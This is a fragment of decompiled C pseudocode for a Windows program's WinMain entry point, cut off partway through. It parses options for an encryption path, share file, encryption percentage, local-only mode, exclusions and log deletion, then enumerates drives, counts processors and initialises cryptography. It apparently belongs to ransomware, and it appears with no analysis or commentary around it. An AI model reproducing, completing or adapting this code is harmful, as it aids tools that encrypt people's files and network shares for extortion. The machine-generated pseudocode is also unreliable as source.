int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  struct tm *v4; // rax
  __int64 v5; // r8
  __int64 v6; // rcx
  const WCHAR *CommandLineW; // rax
  LPWSTR *v8; // rsi
  _QWORD *v9; // rax
  _QWORD *v10; // rax
  _QWORD *v11; // rax
  __int64 v12; // rax
  void *v13; // rcx
  void *v14; // rbx
  __int64 v15; // rcx
  __int64 v16; // rax
  __int64 v17; // r12
  _BYTE *v18; // rcx
  void *v19; // rcx
  __int64 v20; // rax
  void *v21; // rcx
  __int64 v22; // rax
  wchar_t *v23; // rcx
  void *v24; // rdi
  __int64 v25; // rcx
  __int64 v26; // rax
  _BYTE *v27; // rcx
  void *v28; // rcx
  __int64 v29; // rax
  WCHAR *v30; // rcx
  HINSTANCE v31; // r14
  __int64 v32; // rcx
  __int64 v33; // rax
  void *v34; // rcx
  void *v35; // rcx
  void *v36; // rcx
  int *v37; // rax
  int *v38; // r15
  const wchar_t *v39; // rsi
  void *v40; // rcx
  char *v41; // rbx
  char *v42; // rdi
  __int64 v43; // rax
  void *v44; // rcx
  __int64 perf_frequency; // rbx
  __int64 v46; // rax
  __int64 v47; // rdx
  __int64 v48; // rcx
  __int64 v49; // rsi
  const WCHAR *v50; // r8
  int v51; // eax
  CHAR *lpMultiByteStr; // rcx
  const WCHAR *v53; // r8
  void *v54; // rcx
  signed int dwNumberOfProcessors; // ebx
  void *v56; // rcx
  _OWORD *v57; // rax
  void *v58; // r15
  unsigned int v59; // eax
  __int64 v60; // r9
  int v61; // edx
  __int64 v62; // rax
  __int64 v63; // rax
  __int64 v64; // rcx
  _QWORD *v65; // rbx
  __int64 v66; // r8
  unsigned __int64 v67; // rcx
  unsigned __int64 v68; // r15
  size_t v69; // r12
  size_t v70; // r12
  void *v71; // rcx
  _BYTE *v72; // rcx
  _QWORD *v73; // rbx
  __int64 v74; // r8
  unsigned __int64 v75; // rcx
  unsigned __int64 v76; // r15
  void *v77; // rcx
  void *v78; // rcx
  char *v79; // r12
  int v80; // r15d
  char *v81; // r13
  __int64 v82; // rax
  volatile signed __int32 *v83; // rcx
  __int64 v84; // rcx
  char v85; // al
  __int64 v86; // rbx
  __int64 v87; // r12
  int v88; // r14d
  void *v89; // rsi
  char v90; // r15
  __int64 v91; // rax
  int v92; // eax
  int v93; // r8d
  char *v94; // r15
  char *v95; // rcx
  int v96; // r12d
  void *v97; // r14
  char v98; // bl
  __int64 v99; // rax
  int v100; // eax
  int v101; // r8d
  __int64 v102; // rbx
  unsigned __int64 v103; // rcx
  LPCWSTR *v104; // rax
  unsigned __int64 v105; // rcx
  LPCWSTR *v106; // rax
  const WCHAR *v107; // r9
  __int64 v108; // rax
  __int64 v109; // rax
  __int64 v110; // rcx
  WCHAR *v111; // rcx
  __int64 v112; // rbx
  __int64 v113; // rax
  __int64 v114; // rbx
  unsigned __int64 v115; // r8
  void *v116; // rdx
  void *v117; // r8
  __int64 v118; // rcx
  __int64 v119; // rax
  void *v120; // rcx
  void *v121; // rcx
  __int64 v122; // rbx
  void *v123; // r8
  void *v124; // rcx
  WCHAR *v125; // rcx
  wchar_t *v126; // rcx
  void *v127; // rcx
  void *v128; // rcx
  void *v129; // rcx
  unsigned int v131; // [rsp+40h] [rbp-C0h]
  __int128 v132; // [rsp+48h] [rbp-B8h] BYREF
  __int64 v133; // [rsp+58h] [rbp-A8h]
  unsigned __int64 v134; // [rsp+60h] [rbp-A0h]
  __int128 v135; // [rsp+70h] [rbp-90h] BYREF
  char *v136; // [rsp+80h] [rbp-80h] BYREF
  unsigned int v137; // [rsp+88h] [rbp-78h]
  int v138; // [rsp+8Ch] [rbp-74h] BYREF
  HINSTANCE v139; // [rsp+90h] [rbp-70h]
  HINSTANCE v140; // [rsp+98h] [rbp-68h]
  __int128 v141; // [rsp+A0h] [rbp-60h] BYREF
  __int128 v142; // [rsp+B0h] [rbp-50h]
  __int128 v143; // [rsp+C0h] [rbp-40h] BYREF
  __int128 v144; // [rsp+D0h] [rbp-30h]
  __int128 v145; // [rsp+E0h] [rbp-20h] BYREF
  __int128 v146; // [rsp+F0h] [rbp-10h]
  void *Src[2]; // [rsp+100h] [rbp+0h]
  __int64 v148; // [rsp+110h] [rbp+10h]
  __int128 v149; // [rsp+120h] [rbp+20h] BYREF
  __int64 v150; // [rsp+130h] [rbp+30h] BYREF
  __int128 v151; // [rsp+140h] [rbp+40h] BYREF
  __int128 v152; // [rsp+150h] [rbp+50h]
  __int128 v153; // [rsp+160h] [rbp+60h] BYREF
  __int128 v154; // [rsp+170h] [rbp+70h]
  void *v155; // [rsp+188h] [rbp+88h]
  __int128 v156; // [rsp+190h] [rbp+90h] BYREF
  __int64 v157; // [rsp+1A0h] [rbp+A0h]
  unsigned __int64 v158; // [rsp+1A8h] [rbp+A8h]
  _QWORD v159[2]; // [rsp+1B0h] [rbp+B0h] BYREF
  _QWORD v160[2]; // [rsp+1C0h] [rbp+C0h] BYREF
  _QWORD v161[2]; // [rsp+1D0h] [rbp+D0h] BYREF
  __int128 v162; // [rsp+1E0h] [rbp+E0h] BYREF
  __int64 v163; // [rsp+1F0h] [rbp+F0h]
  unsigned __int64 v164; // [rsp+1F8h] [rbp+F8h]
  __int128 v165; // [rsp+200h] [rbp+100h] BYREF
  __int64 v166; // [rsp+210h] [rbp+110h]
  unsigned __int64 v167; // [rsp+218h] [rbp+118h]
  _QWORD v168[4]; // [rsp+220h] [rbp+120h] BYREF
  __int128 v169; // [rsp+240h] [rbp+140h] BYREF
  __int128 v170; // [rsp+250h] [rbp+150h]
  __int128 v171; // [rsp+260h] [rbp+160h] BYREF
  __int128 v172; // [rsp+270h] [rbp+170h]
  _QWORD v173[3]; // [rsp+280h] [rbp+180h] BYREF
  unsigned __int64 v174; // [rsp+298h] [rbp+198h]
  __int128 v175; // [rsp+2A0h] [rbp+1A0h] BYREF
  __int128 v176; // [rsp+2B0h] [rbp+1B0h] BYREF
  __int128 v177; // [rsp+2C0h] [rbp+1C0h] BYREF
  __int128 v178; // [rsp+2D0h] [rbp+1D0h] BYREF
  _BYTE *v179; // [rsp+2E0h] [rbp+1E0h] BYREF
  unsigned __int64 v180; // [rsp+2F8h] [rbp+1F8h]
  _BYTE *v181; // [rsp+300h] [rbp+200h] BYREF
  unsigned __int64 v182; // [rsp+318h] [rbp+218h]
  _BYTE *v183; // [rsp+320h] [rbp+220h] BYREF
  unsigned __int64 v184; // [rsp+338h] [rbp+238h]
  void *v185; // [rsp+340h] [rbp+240h] BYREF
  unsigned __int64 v186; // [rsp+358h] [rbp+258h]
  _QWORD v187[8]; // [rsp+360h] [rbp+260h] BYREF
  char v188[16]; // [rsp+3A0h] [rbp+2A0h] BYREF
  _BYTE v189[32]; // [rsp+3B0h] [rbp+2B0h] BYREF
  _BYTE v190[32]; // [rsp+3D0h] [rbp+2D0h] BYREF
  _BYTE v191[32]; // [rsp+3F0h] [rbp+2F0h] BYREF
  _BYTE v192[32]; // [rsp+410h] [rbp+310h] BYREF
  _QWORD v193[2]; // [rsp+430h] [rbp+330h] BYREF
  char v194[128]; // [rsp+440h] [rbp+340h] BYREF
  _QWORD v195[12]; // [rsp+4C0h] [rbp+3C0h] BYREF
  _QWORD v196[2]; // [rsp+520h] [rbp+420h] BYREF
  char v197[128]; // [rsp+530h] [rbp+430h] BYREF
  _QWORD v198[12]; // [rsp+5B0h] [rbp+4B0h] BYREF
  _QWORD v199[2]; // [rsp+610h] [rbp+510h] BYREF
  char v200[128]; // [rsp+620h] [rbp+520h] BYREF
  _QWORD v201[12]; // [rsp+6A0h] [rbp+5A0h] BYREF
  _QWORD v202[2]; // [rsp+700h] [rbp+600h] BYREF
  char v203[128]; // [rsp+710h] [rbp+610h] BYREF
  void **v204; // [rsp+790h] [rbp+690h] BYREF
  char v205[32]; // [rsp+7F0h] [rbp+6F0h] BYREF
  char v206[32]; // [rsp+810h] [rbp+710h] BYREF
  void *v207; // [rsp+830h] [rbp+730h] BYREF
  wchar_t *EndPtr; // [rsp+838h] [rbp+738h] BYREF
  char v209; // [rsp+840h] [rbp+740h] BYREF
  char v210; // [rsp+841h] [rbp+741h]
  int v211; // [rsp+844h] [rbp+744h] BYREF
  __int128 v212; // [rsp+850h] [rbp+750h] BYREF
  LPCWCH lpWideCharStr[2]; // [rsp+860h] [rbp+760h] BYREF
  int cchWideChar[4]; // [rsp+870h] [rbp+770h]
  LPCWSTR lpParameters[2]; // [rsp+880h] [rbp+780h] BYREF
  unsigned __int64 v216; // [rsp+890h] [rbp+790h]
  unsigned __int64 v217; // [rsp+898h] [rbp+798h]
  _QWORD v218[4]; // [rsp+8A0h] [rbp+7A0h] BYREF
  void *v219[2]; // [rsp+8C0h] [rbp+7C0h] BYREF
  __int64 v220; // [rsp+8D0h] [rbp+7D0h]
  wchar_t *String[2]; // [rsp+8D8h] [rbp+7D8h] BYREF
  __int128 v222; // [rsp+8E8h] [rbp+7E8h]
  int pNumArgs; // [rsp+8F8h] [rbp+7F8h] BYREF
  __int128 v224; // [rsp+900h] [rbp+800h] BYREF
  __int128 v225; // [rsp+910h] [rbp+810h]
  __int128 v226; // [rsp+920h] [rbp+820h] BYREF
  __int64 v227; // [rsp+930h] [rbp+830h]
  _QWORD v228[2]; // [rsp+938h] [rbp+838h] BYREF
  __int64 v229; // [rsp+948h] [rbp+848h] BYREF
  __int128 v230; // [rsp+950h] [rbp+850h]
  void *v231[2]; // [rsp+960h] [rbp+860h] BYREF
  void *Block[2]; // [rsp+970h] [rbp+870h] BYREF
  __int128 v233; // [rsp+980h] [rbp+880h]
  __int64 v234; // [rsp+990h] [rbp+890h]
  unsigned __int64 v235; // [rsp+998h] [rbp+898h]
  LPSTR v236[2]; // [rsp+9A0h] [rbp+8A0h] BYREF
  int cbMultiByte[4]; // [rsp+9B0h] [rbp+8B0h]
  __int128 v238; // [rsp+9C0h] [rbp+8C0h] BYREF
  __int64 v239; // [rsp+9D0h] [rbp+8D0h]
  __time64_t Time; // [rsp+9D8h] [rbp+8D8h] BYREF
  __int128 v241; // [rsp+9E0h] [rbp+8E0h] BYREF
  __int64 v242; // [rsp+9F0h] [rbp+8F0h]
  unsigned __int64 v243; // [rsp+9F8h] [rbp+8F8h]
  _QWORD v244[32]; // [rsp+A00h] [rbp+900h] BYREF
  struct _SYSTEM_INFO SystemInfo; // [rsp+B00h] [rbp+A00h] BYREF
  char Buffer[80]; // [rsp+B30h] [rbp+A30h] BYREF

  unknown_libname_97(a1: &Time, a2: hPrevInstance, a3: lpCmdLine, a4: nShowCmd);
  v4 = localtime64(&Time);
  strftime(Buffer, SizeInBytes: 0x50u, Format: "Log-%d-%m-%Y-%H-%M-%S", Tm: v4);
  v241 = 0;
  v242 = 0;
  v243 = 0;
  v5 = -1;
  do
    ++v5;
  while ( Buffer[v5] != 0 );
  sub_1400376B0(a1: &v241, a2: Buffer);
  sub_14004CF60(a1: v6, a2: &v241);
  memset(v218, 0, 24);
  v218[3] = 7;
  LOWORD(v218[0]) = 0;
  v224 = 0;
  *(_QWORD *)&v225 = 0;
  *((_QWORD *)&v225 + 1) = 7;
  LOWORD(v224) = 0;
  *(_OWORD *)String = 0;
  *(_QWORD *)&v222 = 0;
  *((_QWORD *)&v222 + 1) = 7;
  LOWORD(String[0]) = 0;
  *(_OWORD *)lpWideCharStr = 0;
  *(_QWORD *)cchWideChar = 0;
  *(_QWORD *)&cchWideChar[2] = 7;
  LOWORD(lpWideCharStr[0]) = 0;
  CommandLineW = GetCommandLineW();
  v8 = CommandLineToArgvW(lpCmdLine: CommandLineW, &pNumArgs);
  if ( v8 == nullptr )
  {
    v132 = 0;
    v133 = 0;
    v134 = 0;
    sub_1400376B0(a1: &v132, a2: "Command line to argvW failed!");
    if ( qword_140102188 != 0 )
    {
      sub_140040440(a1: qword_140102188, a2: 4, a3: &v132);
      if ( qword_140102188 != 0 )
        (*(void (__fastcall **)(__int64))(*(_QWORD *)qword_140102188 + 24LL))(a1: qword_140102188);
    }
    if ( v134 >= 0x10 )
    {
      v124 = (void *)v132;
      if ( v134 + 1 >= 0x1000 )
      {
        v124 = *(void **)(v132 - 8);
        if ( (unsigned __int64)(v132 - (_QWORD)v124 - 8) > 0x1F )
          invalid_parameter_noinfo_noreturn();
      }
      j_j_free(Block: v124);
    }
    v80 = 0;
    goto LABEL_262;
  }
  *(_QWORD *)((char *)&v233 + 2) = 0;
  *(_DWORD *)((char *)&v233 + 10) = 0;
  HIWORD(v233) = 0;
  v226 = 0;
  v227 = 0;
  v228[1] = 0;
  v9 = operator new(Size: 0x60u);
  *v9 = v9;
  v9[1] = v9;
  v9[2] = v9;
  *((_WORD *)v9 + 12) = 257;
  v228[0] = v9;
  v229 = 0;
  v230 = 0;
  v231[1] = nullptr;
  v10 = operator new(Size: 0x40u);
  *v10 = v10;
  v10[1] = v10;
  v10[2] = v10;
  *((_WORD *)v10 + 12) = 257;
  v231[0] = v10;
  Block[1] = nullptr;
  v11 = operator new(Size: 0x40u);
  *v11 = v11;
  v11[1] = v11;
  v11[2] = v11;
  *((_WORD *)v11 + 12) = 257;
  Block[0] = v11;
  v233 = 0;
  v234 = 0;
  v235 = 7;
  LOWORD(v233) = 0;
  sub_140054870(a1: &v226, a2: pNumArgs, a3: v8);
  v159[0] = L"-p";
  v159[1] = L"--encryption_path";
  *(_QWORD *)&v135 = v159;
  *((_QWORD *)&v135 + 1) = v160;
  v176 = v135;
  v12 = sub_14004FE80(a1: &v226, a2: v193, a3: &v176);
  sub_140050CD0(a1: v12 + 16, a2: v168);
  if ( v218[3] >= 8u )
  {
    v13 = (void *)v218[0];
    if ( (unsigned __int64)(2LL * v218[3] + 2) >= 0x1000 )
    {
      v13 = *(void **)(v218[0] - 8LL);
      if ( (unsigned __int64)(v218[0] - (_QWORD)v13 - 8LL) > 0x1F )
        invalid_parameter_noinfo_noreturn();
    }
    j_j_free(Block: v13);
  }
  qmemcpy(v218, v168, sizeof(v218));
  v168[2] = 0;
  v168[3] = 7;
  LOWORD(v168[0]) = 0;
  *(_QWORD *)((char *)v193 + *(int *)(v193[0] + 4LL)) = &std::wistringstream::`vftable';
  *(_DWORD *)&v192[*(int *)(v193[0] + 4LL) + 28] = *(_DWORD *)(v193[0] + 4LL) - 144;
  sub_14004FAF0(a1: v194);
  *(_QWORD *)((char *)v193 + *(int *)(v193[0] + 4LL)) = &std::wistream::`vftable';
  *(_DWORD *)&v192[*(int *)(v193[0] + 4LL) + 28] = *(_DWORD *)(v193[0] + 4LL) - 24;
  __eh34_enter_wind_state(-1, 0);
  v195[0] = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(this: (struct std::ios_base *)v195);
  if ( __eh34_unwind(0) )
unwind_state_0:
    terminate();
  __eh34_exit_wind_state(0, -1);
  v162 = 0;
  v163 = 0;
  v164 = 0;
  sub_14003EE60(a1: &v162, a2: L"-l", a3: 2);
  v14 = v231[0];
  v16 = sub_140050EF0(a1: v15, a2: &v181, a3: &v162);
  v17 = sub_140055E70(a1: v231, a2: v16);
  if ( v182 >= 8 )
  {
    v18 = v181;
    if ( 2 * v182 + 2 >= 0x1000 )
    {
      v18 = *((_BYTE **)v181 - 1);
      if ( (unsigned __int64)(v181 - v18 - 8) > 0x1F )
        invalid_parameter_noinfo_noreturn();
    }
    j_j_free(Block: v18);
  }
  if ( v164 >= 8 )
  {
    v19 = (void *)v162;
    if ( 2 * v164 + 2 >= 0x1000 )
    {
      v19 = *(void **)(v162 - 8);
      if ( (unsigned __int64)(v162 - (_QWORD)v19 - 8) > 0x1F )
        invalid_parameter_noinfo_noreturn();
    }
    j_j_free(Block: v19);
  }
  v160[0] = L"-s";
  v160[1] = L"--share_file";
  *(_QWORD *)&v135 = v160;
  *((_QWORD *)&v135 + 1) = v161;
  v175 = v135;
  v20 = sub_14004FE80(a1: &v226, a2: v196, a3: &v175);
  sub_140050CD0(a1: v20 + 16, a2: &v169);
  if ( *((_QWORD *)&v225 + 1) >= 8u )
  {
    v21 = (void *)v224;
    if ( (unsigned __int64)(2LL * *((_QWORD *)&v225 + 1) + 2) >= 0x1000 )
    {
      v21 = *(void **)(v224 - 8);
      if ( (unsigned __int64)(v224 - (_QWORD)v21 - 8) > 0x1F )
        invalid_parameter_noinfo_noreturn();
    }
    j_j_free(Block: v21);
  }
  v224 = v169;
  v225 = v170;
  *(_QWORD *)&v170 = 0;
  *((_QWORD *)&v170 + 1) = 7;
  LOWORD(v169) = 0;
  *(_QWORD *)((char *)v196 + *(int *)(v196[0] + 4LL)) = &std::wistringstream::`vftable';
  *(_DWORD *)((char *)&v195[11] + *(int *)(v196[0] + 4LL) + 4) = *(_DWORD *)(v196[0] + 4LL) - 144;
  sub_14004FAF0(a1: v197);
  *(_QWORD *)((char *)v196 + *(int *)(v196[0] + 4LL)) = &std::wistream::`vftable';
  *(_DWORD *)((char *)&v195[11] + *(int *)(v196[0] + 4LL) + 4) = *(_DWORD *)(v196[0] + 4LL) - 24;
  __eh34_enter_wind_state(-1, 0);
  v198[0] = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(this: (struct std::ios_base *)v198);
  if ( __eh34_unwind(0) )
    goto unwind_state_0;
  __eh34_exit_wind_state(0, -1);
  v161[0] = L"-n";
  v161[1] = L"--encryption_percent";
  *(_QWORD *)&v135 = v161;
  *((_QWORD *)&v135 + 1) = &v162;
  v177 = v135;
  v22 = sub_14004FE80(a1: &v226, a2: v199, a3: &v177);
  sub_140050CD0(a1: v22 + 16, a2: &v171);
  if ( *((_QWORD *)&v222 + 1) >= 8u )
  {
    v23 = String[0];
    if ( (unsigned __int64)(2LL * *((_QWORD *)&v222 + 1) + 2) >= 0x1000 )
    {
      v23 = *((wchar_t **)String[0] - 1);
      if ( (unsigned __int64)((char *)String[0] - (char *)v23 - 8) > 0x1F )
        invalid_parameter_noinfo_noreturn();
    }
    j_j_free(Block: v23);
  }
  *(_OWORD *)String = v171;
  v222 = v172;
  *(_QWORD *)&v172 = 0;
  *((_QWORD *)&v172 + 1) = 7;
  LOWORD(v171) = 0;
  *(_QWORD *)((char *)v199 + *(int *)(v199[0] + 4LL)) = &std::wistringstream::`vftable';
  *(_DWORD *)((char *)&v198[11] + *(int *)(v199[0] + 4LL) + 4) = *(_DWORD *)(v199[0] + 4LL) - 144;
  sub_14004FAF0(a1: v200);
  *(_QWORD *)((char *)v199 + *(int *)(v199[0] + 4LL)) = &std::wistream::`vftable';
  *(_DWORD *)((char *)&v198[11] + *(int *)(v199[0] + 4LL) + 4) = *(_DWORD *)(v199[0] + 4LL) - 24;
  __eh34_enter_wind_state(-1, 0);
  v201[0] = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(this: (struct std::ios_base *)v201);
  if ( __eh34_unwind(0) )
    goto unwind_state_0;
  __eh34_exit_wind_state(0, -1);
  v165 = 0;
  v166 = 0;
  v167 = 0;
  sub_14003EE60(a1: &v165, a2: L"-localonly", a3: 10);
  v24 = v231[0];
  v26 = sub_140050EF0(a1: v25, a2: &v179, a3: &v165);
  v150 = sub_140055E70(a1: v231, a2: v26);
  if ( v180 >= 8 )
  {
    v27 = v179;
    if ( 2 * v180 + 2 >= 0x1000 )
    {
      v27 = *((_BYTE **)v179 - 1);
      if ( (unsigned __int64)(v179 - v27 - 8) > 0x1F )
        invalid_parameter_noinfo_noreturn();
    }
    j_j_free(Block: v27);
  }
  if ( v167 >= 8 )
  {
    v28 = (void *)v165;
    if ( 2 * v167 + 2 >= 0x1000 )
    {
      v28 = *(void **)(v165 - 8);
      if ( (unsigned __int64)(v165 - (_QWORD)v28 - 8) > 0x1F )
        invalid_parameter_noinfo_noreturn();
    }
    j_j_free(Block: v28);
  }
  *(_QWORD *)&v135 = L"-e";
  *((_QWORD *)&v135 + 1) = L"--exclude";
  *(_QWORD *)&v212 = &v135;
  *((_QWORD *)&v212 + 1) = &v136;
  v178 = v212;
  v29 = sub_14004FE80(a1: &v226, a2: v202, a3: &v178);
  sub_140050CD0(a1: v29 + 16, a2: &v151);
  if ( *(_QWORD *)&cchWideChar[2] >= 8u )
  {
    v30 = (WCHAR *)lpWideCharStr[0];
    if ( (unsigned __int64)(2LL * *(_QWORD *)&cchWideChar[2] + 2) >= 0x1000 )
    {
      v30 = *((WCHAR **)lpWideCharStr[0] - 1);
      if ( (unsigned __int64)((char *)lpWideCharStr[0] - (char *)v30 - 8) > 0x1F )
        invalid_parameter_noinfo_noreturn();
    }
    j_j_free(Block: v30);
  }
  *(_OWORD *)lpWideCharStr = v151;
  *(_OWORD *)cchWideChar = v152;
  *(_QWORD *)&v152 = 0;
  *((_QWORD *)&v152 + 1) = 7;
  LOWORD(v151) = 0;
  *(_QWORD *)((char *)v202 + *(int *)(v202[0] + 4LL)) = &std::wistringstream::`vftable';
  *(_DWORD *)((char *)&v201[11] + *(int *)(v202[0] + 4LL) + 4) = *(_DWORD *)(v202[0] + 4LL) - 144;
  sub_14004FAF0(a1: v203);
  *(_QWORD *)((char *)v202 + *(int *)(v202[0] + 4LL)) = &std::wistream::`vftable';
  *(_DWORD *)((char *)&v201[11] + *(int *)(v202[0] + 4LL) + 4) = *(_DWORD *)(v202[0] + 4LL) - 24;
  __eh34_enter_wind_state(-1, 0);
  v204 = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(this: (struct std::ios_base *)&v204);
  if ( __eh34_unwind(0) )
    goto unwind_state_0;
  __eh34_exit_wind_state(0, -1);
  v132 = 0;
  v133 = 0;
  v134 = 0;
  sub_14003EE60(a1: &v132, a2: L"-dellog", a3: 7);
  v31 = (HINSTANCE)v231[0];
  v140 = (HINSTANCE)v231[0];
  v33 = sub_140050EF0(a1: v32, a2: v173, a3: &v132);
  v139 = (HINSTANCE)sub_140055E70(a1: v231, a2: v33);
  if ( v174 >= 8 )
  {
    v34 = (void *)v173[0];
    if ( 2 * v174 + 2 >= 0x1000 )
    {
      v34 = *(void **)(v173[0] - 8LL);
      if ( (unsigned __int64)(v173[0] - (_QWORD)v34 - 8LL) > 0x1F )
        invalid_parameter_noinfo_noreturn();
    }
    j_j_free(Block: v34);
  }
  if ( v134 >= 8 )
  {
    v35 = (void *)v132;
    if ( 2 * v134 + 2 >= 0x1000 )
    {
      v35 = *(void **)(v132 - 8);
      if ( (unsigned __int64)(v132 - (_QWORD)v35 - 8) > 0x1F )
        invalid_parameter_noinfo_noreturn();
    }
    j_j_free(Block: v35);
  }
  if ( v235 >= 8 )
  {
    v36 = (void *)v233;
    if ( 2 * v235 + 2 >= 0x1000 )
    {
      v36 = *(void **)(v233 - 8);
      if ( (unsigned __int64)(v233 - (_QWORD)v36 - 8) > 0x1F )
        invalid_parameter_noinfo_noreturn();
    }
    j_j_free(Block: v36);
  }
  v234 = 0;
  v235 = 7;
  LOWORD(v233) = 0;
  sub_14005DA10(a1: Block, a2: Block, a3: *((_QWORD *)Block[0] + 1));
  j_j_free(Block: Block[0]);
  sub_14005DA10(a1: v231, a2: v231, a3: *((_QWORD *)v231[0] + 1));
  j_j_free(Block: v231[0]);
  sub_140045000(a1: &v229);
  sub_14004FE10(a1: v228);
  sub_140045000(a1: &v226);
  LocalFree(hMem: v8);
  v211 = 50;
  if ( (_QWORD)v222 != 0 )
  {
    v37 = errno();
    v38 = v37;
    v39 = (const wchar_t *)String;
    if ( *((_QWORD *)&v222 + 1) >= 8u )
      v39 = String[0];
    *v37 = 0;
    v211 = wcstol(String: v39, &EndPtr, Radix: 10);
    if ( v39 == EndPtr )
      sub_14007FC68(a1: "invalid stoi argument");
    if ( *v38 == 34 )
      sub_14007FCB0(a1: "stoi argument out of range");
  }
  *(_OWORD *)v219 = 0;
  v220 = 0;
  sub_14007E6A0(a1: v219);
  if ( v14 != (void *)v17 )
  {
    v132 = 0;
    v133 = 0;
    v134 = 0;
    sub_1400376B0(a1: &v132, a2: "List of drives");
    if ( qword_140102188 != 0 )
    {
      sub_140040440(a1: qword_140102188, a2: 2, a3: &v132);
      if ( qword_140102188 != 0 )
        (*(void (__fastcall **)(__int64))(*(_QWORD *)qword_140102188 + 24LL))(a1: qword_140102188);
    }
    if ( v134 >= 0x10 )
    {
      v40 = (void *)v132;
      if ( v134 + 1 >= 0x1000 )
      {
        v40 = *(void **)(v132 - 8);
        if ( (unsigned __int64)(v132 - (_QWORD)v40 - 8) > 0x1F )
          invalid_parameter_noinfo_noreturn();
      }
      j_j_free(Block: v40);
    }
    v41 = (char *)v219[0];
    v42 = (char *)v219[1];
    while ( v41 != v42 )
    {
      v43 = sub_14007EAF0(a1: v173, a2: v41, a3: 0);
      if ( qword_140102188 != 0 )
      {
        sub_140040440(a1: qword_140102188, a2: 2, a3: v43);
        if ( qword_140102188 != 0 )
          (*(void (__fastcall **)(__int64))(*(_QWORD *)qword_140102188 + 24LL))(a1: qword_140102188);
      }
      if ( v174 >= 0x10 )
      {
        v44 = (void *)v173[0];
        if ( v174 + 1 >= 0x1000 )
        {
          v44 = *(void **)(v173[0] - 8LL);
          if ( (unsigned __int64)(v173[0] - (_QWORD)v44 - 8LL) > 0x1F )
            invalid_parameter_noinfo_noreturn();
        }
        j_j_free(Block: v44);
      }
      v41 += 40;
    }
    goto LABEL_249;
  }
  perf_frequency = Query_perf_frequency();
  v46 = sub_140080F48();
  if ( perf_frequency == 10000000 )
  {
    v49 = 100 * v46;
  }
  else
  {
    v47 = 1000000000 * (v46 % perf_frequency) % perf_frequency;
    v49 = 1000000000 * (v46 % perf_frequency) / perf_frequency + 1000000000 * (v46 / perf_frequency);
  }
  v136 = (char *)v49;
  sub_1400700D0(a1: v48, a2: v47);
  if ( *(_QWORD *)cchWideChar != 0 )
  {
    v50 = (const WCHAR *)lpWideCharStr;
    if ( *(_QWORD *)&cchWideChar[2] >= 8u )
      v50 = lpWideCharStr[0];
    v51 = WideCharToMultiByte(
            CodePage: 0,
            dwFlags: 0,
            lpWideCharStr: v50,
            cchWideChar: cchWideChar[0],
            lpMultiByteStr: nullptr,
            cbMultiByte: 0,
            lpDefaultChar: nullptr,
            lpUsedDefaultChar: nullptr);
    if ( v51 != 0 )
    {
      sub_14003B550(a1: v236, a2: v51, a3: 0);
      lpMultiByteStr = (CHAR *)v236;
      if ( *(_QWORD *)&cbMultiByte[2] >= 0x10u )
        lpMultiByteStr = v236[0];
      v53 = (const WCHAR *)lpWideCharStr;
      if ( *(_QWORD *)&cchWideChar[2] >= 8u )
        v53 = lpWideCharStr[0];
      WideCharToMultiByte(
        CodePage: 0,
        dwFlags: 0,
        lpWideCharStr: v53,
        cchWideChar: cchWideChar[0],
        lpMultiByteStr,
        cbMultiByte: cbMultiByte[0],
        lpDefaultChar: nullptr,
        lpUsedDefaultChar: nullptr);
      v153 = *(_OWORD *)v236;
      v154 = *(_OWORD *)cbMultiByte;
      *(_QWORD *)cbMultiByte = 0;
      *(_QWORD *)&cbMultiByte[2] = 15;
      LOBYTE(v236[0]) = 0;
    }
    else
    {
      v153 = 0;
      *(_QWORD *)&v154 = 0;
      *((_QWORD *)&v154 + 1) = 15;
      LOBYTE(v153) = 0;
    }
    sub_140070410(a1: &v153);
    if ( *((_QWORD *)&v154 + 1) >= 0x10u )
    {
      v54 = (void *)v153;
      if ( (unsigned __int64)(*((_QWORD *)&v154 + 1) + 1LL) >= 0x1000 )
      {
        v54 = *(void **)(v153 - 8);
        if ( (unsigned __int64)(v153 - (_QWORD)v54 - 8) > 0x1F )
          invalid_parameter_noinfo_noreturn();
      }
      j_j_free(Block: v54);
    }
  }
  sub_140078AC0();
  sub_140079C10();
  GetSystemInfo(lpSystemInfo: &SystemInfo);
  dwNumberOfProcessors = SystemInfo.dwNumberOfProcessors;
  if ( SystemInfo.dwNumberOfProcessors == 0 )
  {
    v132 = 0;
    v133 = 0;
    v134 = 0;
    sub_1400376B0(a1: &v132, a2: "No cpu available!");
    if ( qword_140102188 != 0 )
    {
      sub_140040440(a1: qword_140102188, a2: (unsigned int)(dwNumberOfProcessors + 4), a3: &v132);
      if ( qword_140102188 != 0 )
        (*(void (__fastcall **)(__int64))(*(_QWORD *)qword_140102188 + 24LL))(a1: qword_140102188);
    }
    if ( v134 < 0x10 )
      goto LABEL_249;
    v56 = (void *)v132;
    if ( v134 + 1 >= 0x1000 )
    {
      v56 = *(void **)(v132 - 8);
      if ( (unsigned __int64)(v132 - (_QWORD)v56 - 8) > 0x1F )
        invalid_parameter_noinfo_noreturn();
      __eh34_enter_wind_state(-1, 0);
      if ( __eh34_unwind(0) )
        goto unwind_state_0;
      __eh34_exit_wind_state(0, -1);
    }
    goto LABEL_248;
  }
  v57 = operator new(Size: 0x38u);
  *v57 = 0;
  v57[1] = 0;
  v57[2] = 0;
  *((_QWORD *)v57 + 6) = 0;
  v58 = (void *)sub_140083620(a1: v57);
  v155 = v58;
  if ( v58 == nullptr
    || (v59 = unknown_libname_75(a1: &unk_1400FB080),
        LOBYTE(v60) = 1,
        (unsigned int)sub_140084210(a1: v58, a2: v59, a3: &unk_1400FA080, a4: v60) != 0) )
  {
    sub_1400372D0(a1: &v151, a2: "Init crypto failed!");
    if ( qword_140102188 != 0 )
    {
      sub_140040440(a1: qword_140102188, a2: 4, a3: &v151);
      if ( qword_140102188 != 0 )
        (*(void (__fastcall **)(__int64))(*(_QWORD *)qword_140102188 + 24LL))(a1: qword_140102188);
    }
    if ( *((_QWORD *)&v152 + 1) >= 0x10u )
    {
      v56 = (void *)v151;
      if ( (unsigned __int64)(*((_QWORD *)&v152 + 1) + 1LL) >= 0x1000 )
      {
        v56 = *(void **)(v151 - 8);
        if ( (unsigned __int64)(v151 - (_QWORD)v56 - 8) > 0x1F )
          invalid_parameter_noinfo_noreturn();
      }
LABEL_248:
      j_j_free(Block: v56);
